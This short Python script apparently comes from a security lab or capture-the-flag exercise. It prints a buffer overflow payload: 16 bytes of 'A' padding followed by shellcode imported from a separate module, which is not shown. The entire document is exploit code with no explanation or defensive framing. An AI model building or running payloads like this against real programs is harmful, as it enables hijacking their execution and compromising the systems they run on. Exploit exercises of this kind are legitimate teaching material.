from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'A' * 16 + shellcode)